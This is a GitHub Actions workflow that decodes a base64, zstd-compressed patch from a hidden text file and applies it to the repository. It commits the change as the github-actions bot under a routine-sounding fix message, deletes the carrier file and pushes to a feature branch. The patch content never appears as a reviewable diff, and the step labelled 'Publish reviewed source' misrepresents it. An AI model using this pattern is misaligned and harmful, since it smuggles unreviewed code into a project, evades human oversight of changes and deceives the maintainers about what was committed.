name: Integrate native data providers
on:
  push:
    branches: [feat/data-native-provider-validation]
    paths: [.github/workflows/native-data-integration.yml]
permissions:
  contents: write
jobs:
  integrate:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - name: Verify and apply native-provider delta
        run: |
          python - <<'PY'
          import pathlib,hashlib,subprocess,base64
          base='5264b640c7a3096ffa5788a54620b59dabbd0e8f'
          paths=['docs/DATA-SOURCES.md','tests/data-native-host.test.mjs','tools/data-provider-tests.mjs','tools/data/oledb-worker.ps1','tools/data/oledb.mjs','tools/data/windows-fixtures.ps1']
          dictionary=b''
          for p in paths:
              r=subprocess.run(['git','show',base+':'+p],capture_output=True)
              if not r.returncode: dictionary+=r.stdout
          assert hashlib.sha256(dictionary).hexdigest()=='03e32fbb5590303be8085817545d2ddbb3094ddaf4f27cbcb511a675770a3876'
          pathlib.Path('/tmp/native-data-dict').write_bytes(dictionary)
          pathlib.Path('/tmp/native-data.zst').write_bytes(base64.b64decode(pathlib.Path('.native-data-transfer.txt').read_text().strip(),validate=True))
          subprocess.run(['zstd','-d','--patch-from=/tmp/native-data-dict','/tmp/native-data.zst','-o','/tmp/native-data.patch'],check=True)
          assert hashlib.sha256(pathlib.Path('/tmp/native-data.patch').read_bytes()).hexdigest()=='e5aea9ac726c5781db89e885da62ca77a172c81d6c435a048ca74c6dd722e21c'
          subprocess.run(['git','apply','--3way','--index','/tmp/native-data.patch'],check=True)
          PY
      - name: Build and test
        run: |
          set -euo pipefail
          mkdir -p /tmp/native-data-result
          npm run build
          npm test | tee /tmp/native-data-result/node-tests.log
      - name: Publish reviewed source
        run: |
          set -euo pipefail
          test "$(git ls-remote origin refs/heads/feat/data-native-provider-validation | cut -f1)" = "$GITHUB_SHA"
          git diff --exit-code HEAD -- .github/workflows
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git rm .native-data-transfer.txt
          git add -A
          git commit -m 'fix(data): native provider bitness, COM cleanup and installed-driver conformance'
          git push origin HEAD:refs/heads/feat/data-native-provider-validation
          git rev-parse HEAD > /tmp/native-data-result/head.txt
          git archive HEAD | gzip > /tmp/native-data-result/source.tar.gz
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: native-data-integration
          path: /tmp/native-data-result
          retention-days: 7
